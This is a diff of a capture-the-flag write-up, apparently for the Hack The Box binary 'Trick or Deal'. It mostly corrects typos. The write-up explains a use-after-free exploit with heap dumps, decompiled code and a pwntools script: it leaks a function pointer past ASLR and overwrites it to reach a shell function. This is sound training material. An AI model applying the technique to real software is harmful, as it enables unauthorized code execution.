@@ -11,11 +11,11 @@ draft: true
 This binary has a secret function `unlock_storage()`, and a **Use-After-Free** vulnerability.
 
 To exploit this binary, I will use [pwndbg](https://github.com/pwndbg/pwndbg) and [pwntools](https://docs.pwntools.com/en/stable/).  
-[Ghidra](https://ghidra-sre.org/) was also used for the analysis. The snipets of **C** code were obtained using the *Ghidra decompiler*.
+[Ghidra](https://ghidra-sre.org/) was also used for the analysis. The snippets of **C** code were obtained using the *Ghidra decompiler*.
 
 # Analysis
 
-The binary gives us a **menu** with **5 actions**. Each actions will call a function.
+The binary gives us a **menu** with **5 actions**. Each action will call a function.
 
 ```
 -_-_-_-_-_-_-_-_-_-_-_-_-
@@ -37,8 +37,8 @@ Let's investigate.
 
 The *5th action* simply quit the binary.
 
-The *2nd action* `[2] Buy Weapons` call the fuction **`buy()`** and has **no interest** for us.  
-It simply output back what we write.
+The *2nd action* `[2] Buy Weapons` call the function **`buy()`** and has **no interest** for us.  
+It simply output back our input.
 
 ```C
 void buy(void)
@@ -90,17 +90,17 @@ Starting program: <font color="#A6E22E">/home/hackthebox/challenge/pwn/Trick_or_
 
 <font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 
 
-0x555555603000	<font color="#F4BF75">0x0000000000000000</font>	<font color="#A1EFE4">0x0000000000000291</font>	<font color="#A1EFE4">................</font>
-0x555555603010	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#A1EFE4">................</font>
+0x555555603000  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000291</font> <font color="#A1EFE4">................</font>
+0x555555603010  <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">................</font>
 [...]
 
-0x555555603290	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#AE81FF">0x0000000000000061</font>	<font color="#AE81FF">........a.......</font>
-0x5555556032a0	<font color="#AE81FF">0x67694c206568540a</font>	<font color="#AE81FF">0x0a72656261737468</font>	<font color="#AE81FF">.The Lightsaber.</font>
-0x5555556032b0	<font color="#AE81FF">0x6e6f53206568540a</font>	<font color="#AE81FF">0x7765726353206369</font>	<font color="#AE81FF">.The Sonic Screw</font>
-0x5555556032c0	<font color="#AE81FF">0x0a0a726576697264</font>	<font color="#AE81FF">0x0a73726573616850</font>	<font color="#AE81FF">driver..Phasers.</font>
-0x5555556032d0	<font color="#AE81FF">0x696f4e206568540a</font>	<font color="#AE81FF">0x6b63697243207973</font>	<font color="#AE81FF">.The Noisy Crick</font>
-0x5555556032e0	<font color="#AE81FF">0x00000000000a7465</font>	<font color="#AE81FF">0x0000555555400be6</font>	<font color="#AE81FF">et........@UUU..</font>
-0x5555556032f0	<font color="#AE81FF">0x0000000000000000</font>	<font color="#A6E22E">0x0000000000020d11</font>	<font color="#A6E22E">................</font>	 &lt;-- Top chunk
+0x555555603290  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000000061</font> <font color="#AE81FF">........a.......</font>
+0x5555556032a0  <font color="#AE81FF">0x67694c206568540a</font> <font color="#AE81FF">0x0a72656261737468</font> <font color="#AE81FF">.The Lightsaber.</font>
+0x5555556032b0  <font color="#AE81FF">0x6e6f53206568540a</font> <font color="#AE81FF">0x7765726353206369</font> <font color="#AE81FF">.The Sonic Screw</font>
+0x5555556032c0  <font color="#AE81FF">0x0a0a726576697264</font> <font color="#AE81FF">0x0a73726573616850</font> <font color="#AE81FF">driver..Phasers.</font>
+0x5555556032d0  <font color="#AE81FF">0x696f4e206568540a</font> <font color="#AE81FF">0x6b63697243207973</font> <font color="#AE81FF">.The Noisy Crick</font>
+0x5555556032e0  <font color="#AE81FF">0x00000000000a7465</font> <font color="#AE81FF">0x0000555555400be6</font> <font color="#AE81FF">et........@UUU..</font>
+0x5555556032f0  <font color="#AE81FF">0x0000000000000000</font> <font color="#A6E22E">0x0000000000020d11</font> <font color="#A6E22E">................</font>  &lt;-- Top chunk
 </code></pre></div>
 {{< /rawhtml >}}
 
@@ -115,21 +115,21 @@ We can see that `0x555555603290` is a pointer to `printStorage()` using the **`d
 {{< rawhtml >}}
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>disassemble 0x0000555555400be6
 Dump of assembler code for function <font color="#F4BF75">printStorage</font>:
-   <font color="#66D9EF">0x0000555555400be6</font> &lt;+0&gt;:	<font color="#A6E22E">push</font><font color="#F8F8F2">   </font><font color="#F92672">rbp</font>
-   <font color="#66D9EF">0x0000555555400be7</font> &lt;+1&gt;:	<font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rbp</font>,<font color="#F92672">rsp</font>
-   <font color="#66D9EF">0x0000555555400bea</font> &lt;+4&gt;:	<font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rax</font>,<font color="#F92672">QWORD</font><font color="#F8F8F2"> </font><font color="#F92672">PTR</font><font color="#F8F8F2"> </font>[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x20144f</font>]<font color="#F8F8F2">        # 0x555555602040 &lt;storage&gt;</font>
-   <font color="#66D9EF">0x0000555555400bf1</font> &lt;+11&gt;:	<font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rdx</font>,<font color="#F92672">rax</font>
-   <font color="#66D9EF">0x0000555555400bf4</font> &lt;+14&gt;:	<font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rax</font>,<font color="#F92672">QWORD</font><font color="#F8F8F2"> </font><font color="#F92672">PTR</font><font color="#F8F8F2"> </font>[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x201425</font>]<font color="#F8F8F2">        # 0x555555602020 &lt;stdout@@GLIBC_2.2.5&gt;</font>
-   <font color="#66D9EF">0x0000555555400bfb</font> &lt;+21&gt;:	<font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">r8</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x63f</font>]<font color="#F8F8F2">        # 0x555555401241</font>
-   <font color="#66D9EF">0x0000555555400c02</font> &lt;+28&gt;:	<font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rcx</font>,<font color="#F92672">rdx</font>
-   <font color="#66D9EF">0x0000555555400c05</font> &lt;+31&gt;:	<font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">rdx</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x67f</font>]<font color="#F8F8F2">        # 0x55555540128b</font>
-   <font color="#66D9EF">0x0000555555400c0c</font> &lt;+38&gt;:	<font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">rsi</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x6ad</font>]<font color="#F8F8F2">        # 0x5555554012c0</font>
-   <font color="#66D9EF">0x0000555555400c13</font> &lt;+45&gt;:	<font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rdi</font>,<font color="#F92672">rax</font>
-   <font color="#66D9EF">0x0000555555400c16</font> &lt;+48&gt;:	<font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">eax</font>,<font color="#66D9EF">0x0</font>
-   <font color="#66D9EF">0x0000555555400c1b</font> &lt;+53&gt;:	<font color="#A6E22E">call</font><font color="#F8F8F2">   </font><font color="#66D9EF">0x555555400920</font> &lt;<font color="#F92672">fprintf@plt</font>&gt;
-   <font color="#66D9EF">0x0000555555400c20</font> &lt;+58&gt;:	<font color="#A6E22E">nop</font>
-   <font color="#66D9EF">0x0000555555400c21</font> &lt;+59&gt;:	<font color="#A6E22E">pop</font><font color="#F8F8F2">    </font><font color="#F92672">rbp</font>
-   <font color="#66D9EF">0x0000555555400c22</font> &lt;+60&gt;:	<font color="#A6E22E">ret</font><font color="#F8F8F2">    </font>
+   <font color="#66D9EF">0x0000555555400be6</font> &lt;+0&gt;:  <font color="#A6E22E">push</font><font color="#F8F8F2">   </font><font color="#F92672">rbp</font>
+   <font color="#66D9EF">0x0000555555400be7</font> &lt;+1&gt;:  <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rbp</font>,<font color="#F92672">rsp</font>
+   <font color="#66D9EF">0x0000555555400bea</font> &lt;+4&gt;:  <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rax</font>,<font color="#F92672">QWORD</font><font color="#F8F8F2"> </font><font color="#F92672">PTR</font><font color="#F8F8F2"> </font>[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x20144f</font>]<font color="#F8F8F2">        # 0x555555602040 &lt;storage&gt;</font>
+   <font color="#66D9EF">0x0000555555400bf1</font> &lt;+11&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rdx</font>,<font color="#F92672">rax</font>
+   <font color="#66D9EF">0x0000555555400bf4</font> &lt;+14&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rax</font>,<font color="#F92672">QWORD</font><font color="#F8F8F2"> </font><font color="#F92672">PTR</font><font color="#F8F8F2"> </font>[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x201425</font>]<font color="#F8F8F2">        # 0x555555602020 &lt;stdout@@GLIBC_2.2.5&gt;</font>
+   <font color="#66D9EF">0x0000555555400bfb</font> &lt;+21&gt;: <font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">r8</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x63f</font>]<font color="#F8F8F2">        # 0x555555401241</font>
+   <font color="#66D9EF">0x0000555555400c02</font> &lt;+28&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rcx</font>,<font color="#F92672">rdx</font>
+   <font color="#66D9EF">0x0000555555400c05</font> &lt;+31&gt;: <font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">rdx</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x67f</font>]<font color="#F8F8F2">        # 0x55555540128b</font>
+   <font color="#66D9EF">0x0000555555400c0c</font> &lt;+38&gt;: <font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">rsi</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x6ad</font>]<font color="#F8F8F2">        # 0x5555554012c0</font>
+   <font color="#66D9EF">0x0000555555400c13</font> &lt;+45&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rdi</font>,<font color="#F92672">rax</font>
+   <font color="#66D9EF">0x0000555555400c16</font> &lt;+48&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">eax</font>,<font color="#66D9EF">0x0</font>
+   <font color="#66D9EF">0x0000555555400c1b</font> &lt;+53&gt;: <font color="#A6E22E">call</font><font color="#F8F8F2">   </font><font color="#66D9EF">0x555555400920</font> &lt;<font color="#F92672">fprintf@plt</font>&gt;
+   <font color="#66D9EF">0x0000555555400c20</font> &lt;+58&gt;: <font color="#A6E22E">nop</font>
+   <font color="#66D9EF">0x0000555555400c21</font> &lt;+59&gt;: <font color="#A6E22E">pop</font><font color="#F8F8F2">    </font><font color="#F92672">rbp</font>
+   <font color="#66D9EF">0x0000555555400c22</font> &lt;+60&gt;: <font color="#A6E22E">ret</font><font color="#F8F8F2">    </font>
 End of assembler dump.
 </code></pre></div>
 {{< /rawhtml >}}
@@ -147,7 +147,7 @@ void update_weapons(void)
 }
 ```
 
-Having functions pointers mixed with data is interesting for us. If we can tamper with the a function pointer, it might give us the ability to call other functions.
+Having functions pointers mixed with data is interesting for us. If we can tamper with a function pointer, it might give us the ability to call other functions.
 
 ## Useful functions
 
@@ -238,17 +238,17 @@ Size: 0x20d11
 
 <font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 
 
-0x555555603000	<font color="#F4BF75">0x0000000000000000</font>	<font color="#A1EFE4">0x0000000000000291</font>	<font color="#A1EFE4">................</font>
-0x555555603010	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#A1EFE4">0x0000000000000001</font>	<font color="#A1EFE4">................</font>
-0x555555603020	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#A1EFE4">................</font>
+0x555555603000  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000291</font> <font color="#A1EFE4">................</font>
+0x555555603010  <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000001</font> <font color="#A1EFE4">................</font>
+0x555555603020  <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">................</font>
 [...]
-0x555555603290	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#AE81FF">0x0000000000000061</font>	<font color="#AE81FF">........a.......</font>
-0x5555556032a0	<font color="#AE81FF">0x0000000000000000</font>	<font color="#AE81FF">0x0000555555603010</font>	<font color="#AE81FF">.........0`UUU..</font>	 &lt;-- tcachebins[0x60][0/1]
-0x5555556032b0	<font color="#AE81FF">0x6e6f53206568540a</font>	<font color="#AE81FF">0x7765726353206369</font>	<font color="#AE81FF">.The Sonic Screw</font>
-0x5555556032c0	<font color="#AE81FF">0x0a0a726576697264</font>	<font color="#AE81FF">0x0a73726573616850</font>	<font color="#AE81FF">driver..Phasers.</font>
-0x5555556032d0	<font color="#AE81FF">0x696f4e206568540a</font>	<font color="#AE81FF">0x6b63697243207973</font>	<font color="#AE81FF">.The Noisy Crick</font>
-0x5555556032e0	<font color="#AE81FF">0x00000000000a7465</font>	<font color="#AE81FF">0x0000555555400be6</font>	<font color="#AE81FF">et........@UUU..</font>
-0x5555556032f0	<font color="#AE81FF">0x0000000000000000</font>	<font color="#A6E22E">0x0000000000020d11</font>	<font color="#A6E22E">................</font>	 &lt;-- Top chu
+0x555555603290  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000000061</font> <font color="#AE81FF">........a.......</font>
+0x5555556032a0  <font color="#AE81FF">0x0000000000000000</font> <font color="#AE81FF">0x0000555555603010</font> <font color="#AE81FF">.........0`UUU..</font>  &lt;-- tcachebins[0x60][0/1]
+0x5555556032b0  <font color="#AE81FF">0x6e6f53206568540a</font> <font color="#AE81FF">0x7765726353206369</font> <font color="#AE81FF">.The Sonic Screw</font>
+0x5555556032c0  <font color="#AE81FF">0x0a0a726576697264</font> <font color="#AE81FF">0x0a73726573616850</font> <font color="#AE81FF">driver..Phasers.</font>
+0x5555556032d0  <font color="#AE81FF">0x696f4e206568540a</font> <font color="#AE81FF">0x6b63697243207973</font> <font color="#AE81FF">.The Noisy Crick</font>
+0x5555556032e0  <font color="#AE81FF">0x00000000000a7465</font> <font color="#AE81FF">0x0000555555400be6</font> <font color="#AE81FF">et........@UUU..</font>
+0x5555556032f0  <font color="#AE81FF">0x0000000000000000</font> <font color="#A6E22E">0x0000000000020d11</font> <font color="#A6E22E">................</font>  &lt;-- Top chu
 </pre></code></pre></div>
 {{< /rawhtml >}}
 
@@ -256,7 +256,7 @@ Size: 0x20d11
 
 ### Malloc()
 
-The *3rd action* call the function `make_offer()` that **malloc** a memory of arbitrary size. And let us write data in this new *chunk*.
+The *3rd action* call the function `make_offer()` that **malloc** an arbitrary sized chunk. And let us write data in this new *chunk*.
 
 ```C
 void make_offer(void)
@@ -290,7 +290,7 @@ void make_offer(void)
 ```
 
 
-Again, let's do this in *gdb* an observe the memory with `vis_heap_chunks`.
+Again, let's do this in *gdb* and observe the memory with `vis_heap_chunks`.
 
 {{< rawhtml >}}
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ gdb -q ./trick_or_deal
@@ -316,16 +316,16 @@ Starting program: <font color="#A6E22E">./trick_or_deal</font>
 
 <font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 2 0x555555603290
 
-0x555555603290	<font color="#F4BF75">0x0000000000000000</font>	<font color="#A1EFE4">0x0000000000000061</font>	<font color="#A1EFE4">........a.......</font>
-0x5555556032a0	<font color="#A1EFE4">0x67694c206568540a</font>	<font color="#A1EFE4">0x0a72656261737468</font>	<font color="#A1EFE4">.The Lightsaber.</font>
-0x5555556032b0	<font color="#A1EFE4">0x6e6f53206568540a</font>	<font color="#A1EFE4">0x7765726353206369</font>	<font color="#A1EFE4">.The Sonic Screw</font>
-0x5555556032c0	<font color="#A1EFE4">0x0a0a726576697264</font>	<font color="#A1EFE4">0x0a73726573616850</font>	<font color="#A1EFE4">driver..Phasers.</font>
-0x5555556032d0	<font color="#A1EFE4">0x696f4e206568540a</font>	<font color="#A1EFE4">0x6b63697243207973</font>	<font color="#A1EFE4">.The Noisy Crick</font>
-0x5555556032e0	<font color="#A1EFE4">0x00000000000a7465</font>	<font color="#A1EFE4">0x0000555555400be6</font>	<font color="#A1EFE4">et........@UUU..</font>
-0x5555556032f0	<font color="#A1EFE4">0x0000000000000000</font>	<font color="#AE81FF">0x0000000000000031</font>	<font color="#AE81FF">........1.......</font>
-0x555555603300	<font color="#AE81FF">0x5959595959595959</font>	<font color="#AE81FF">0x5959595959595959</font>	<font color="#AE81FF">YYYYYYYYYYYYYYYY</font>
-0x555555603310	<font color="#AE81FF">0x000000000000000a</font>	<font color="#AE81FF">0x0000000000000000</font>	<font color="#AE81FF">................</font>
-0x555555603320	<font color="#AE81FF">0x0000000000000000</font>	<font color="#A6E22E">0x0000000000020ce1</font>	<font color="#A6E22E">................</font>	 &lt;-- Top chunk
+0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
+0x5555556032a0  <font color="#A1EFE4">0x67694c206568540a</font> <font color="#A1EFE4">0x0a72656261737468</font> <font color="#A1EFE4">.The Lightsaber.</font>
+0x5555556032b0  <font color="#A1EFE4">0x6e6f53206568540a</font> <font color="#A1EFE4">0x7765726353206369</font> <font color="#A1EFE4">.The Sonic Screw</font>
+0x5555556032c0  <font color="#A1EFE4">0x0a0a726576697264</font> <font color="#A1EFE4">0x0a73726573616850</font> <font color="#A1EFE4">driver..Phasers.</font>
+0x5555556032d0  <font color="#A1EFE4">0x696f4e206568540a</font> <font color="#A1EFE4">0x6b63697243207973</font> <font color="#A1EFE4">.The Noisy Crick</font>
+0x5555556032e0  <font color="#A1EFE4">0x00000000000a7465</font> <font color="#A1EFE4">0x0000555555400be6</font> <font color="#A1EFE4">et........@UUU..</font>
+0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000000031</font> <font color="#AE81FF">........1.......</font>
+0x555555603300  <font color="#AE81FF">0x5959595959595959</font> <font color="#AE81FF">0x5959595959595959</font> <font color="#AE81FF">YYYYYYYYYYYYYYYY</font>
+0x555555603310  <font color="#AE81FF">0x000000000000000a</font> <font color="#AE81FF">0x0000000000000000</font> <font color="#AE81FF">................</font>
+0x555555603320  <font color="#AE81FF">0x0000000000000000</font> <font color="#A6E22E">0x0000000000020ce1</font> <font color="#A6E22E">................</font>  &lt;-- Top chunk
 </code></pre></div>
 {{< /rawhtml >}}
 
@@ -352,11 +352,11 @@ void unlock_storage(void)
 
 ## Recap
 
-The binary has a variable **`storage`** that holds some *ascii data* and a **pointer** to `printStorage()`. The binary also has a secret function `unlock_storage()` that gives us a shell.
+The binary has a variable **`storage`** that holds some *ASCII data* and a **pointer** to `printStorage()`. The binary also has a secret function `unlock_storage()` that gives us a shell.
 
-* action **1** will **follow the pointer** in `storage` to call `printStorage()`. This prints the data of `storage`.
-* action **3** *malloc()* an arbitrary size, and write data into this new memory.
-* action **4** *free()* the variable `storage`.
+* Action **1** will **follow the pointer** in `storage` to call `printStorage()`. This prints the data of `storage`.
+* Action **3** *malloc()* an arbitrary sized chunk, and write data into this new memory.
+* Action **4** *free()* the variable `storage`.
 
 
 >  If you haven't solved the binary yet. Stop here, and try to exploit the binary.
@@ -364,7 +364,7 @@ The binary has a variable **`storage`** that holds some *ascii data* and a **poi
 
 ## The Bug
 
-We have a **Use-After-Free** bug, which mean that the program does not check if the memory has been free when we call the functions. Here we have a possibilty to realloc data of our own, and still use the *action 1* that call the pointer present on the heap.
+We have a **Use-After-Free** bug, which means that the program does not check if the memory has been free when we call the functions. Here we have a possibility to realloc data of our own, and still use the *action 1* that call the pointer present on the heap.
 
 
 ## The exploit
@@ -373,11 +373,11 @@ Our strategy is to **replace** the pointer to `printStorage()` with a pointer to
 
 Since the binary is protected with *ASLR*, we first need to **leak** the `printStorage()` pointer. We can then calculate the address of `unlock_storage()` by adding the needed *offset* to our *leaked pointer*.
 
-Fist let's create an exploit skeleton use the `pwn template` command from pwntools.
+Fist let's create an exploit skeleton use the `pwn template` command of pwntools.
 
     $ pwn template trick_or_deal
 
-and let's add a few helper function, to make or exloit developement easier.
+And let's add a few helper functions, to make or exploit development easier.
 
 ```Python
 #!/usr/bin/env python3
@@ -385,15 +385,15 @@ and let's add a few helper function, to make or exloit developement easier.
 
 from pwn import *
 
-# Create a new pane the tilix terminal emulator when using the GDB option
+# Create a new pane the Tilix terminal emulator when using the GDB option
 # context.terminal = ['tilix','--action=session-add-right', '-e']
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('trick_or_deal')
 
-# Many built-in settings can be controlled on the command-line and show up
+# Many built-in settings can be controlled on the command line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
+# for all created processes.
 # ./exploit.py DEBUG NOASLR
 
 
@@ -447,7 +447,7 @@ io.interactive()
 
 ### Leak address
 
-We free the inital buffer, and we malloc 
+We free the initial buffer, and we malloc enough data to bridge the pointer we aim to leak. By leaving no space before the variable, it will be printed when we call `printStorage()`.
 
 ```Python
 io = start()
@@ -469,7 +469,7 @@ io.interactive()
 
 Note that the chunk is of size *0x60*, so we malloc *0x58* as malloc add *8* bytes for chunk metadata.
 
-Initally the heap looked like this :
+Initially the heap looked like this :
 
 {{< rawhtml >}}
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 2 0x555555603290 
@@ -500,7 +500,7 @@ We can run our script with debugging options `$ ./xpl.py NOASLR DEBUG GDB`.
 {{< /rawhtml >}}
 
 
-We have fill the buffer with `'Y'` and there are no  `'\x00'` left that would indicate a end of file.
+We have filled the buffer with `'Y'` and there is no  `'\x00'` left that would indicate an *end of file*.
 The pointer will be considered as part of the string and will be printed when we call `printStorage()`.
 
 
